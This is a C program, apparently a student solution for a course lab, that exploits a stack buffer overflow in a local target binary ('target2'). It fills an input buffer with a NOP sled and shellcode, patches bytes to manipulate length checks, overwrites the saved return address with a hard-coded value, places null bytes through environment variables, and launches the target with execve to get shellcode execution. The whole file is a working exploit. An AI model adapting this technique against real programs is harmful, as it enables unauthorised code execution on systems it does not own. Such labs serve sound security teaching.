#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[6];


    uint8_t input[370];
    memset(input, 0x90, sizeof(input));
    memcpy(&input, shellcode, sizeof(shellcode) - 1);
    input[272] = 0x30;
    input[273] = 0x01;
    input[274] = 0x0;
    input[275] = 0x0;
    /* input[276] is the start of env[1] */
    input[284] = 0x27;

    uint64_t *return_address = (uint64_t *) &input[296];
    *return_address = 0x0000000040A4FD70;

    input[296 + 8] = 0x0;

    args[0] = TARGET;
    args[1] = (char *) input;
    args[2] = NULL;

    env[0] = &input[275];
    env[1] = &input[276];
    env[2] = &input[301]; // 0 "\0"
    env[3] = &input[302];
    env[4] = &input[303];
    env[5] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}"\0"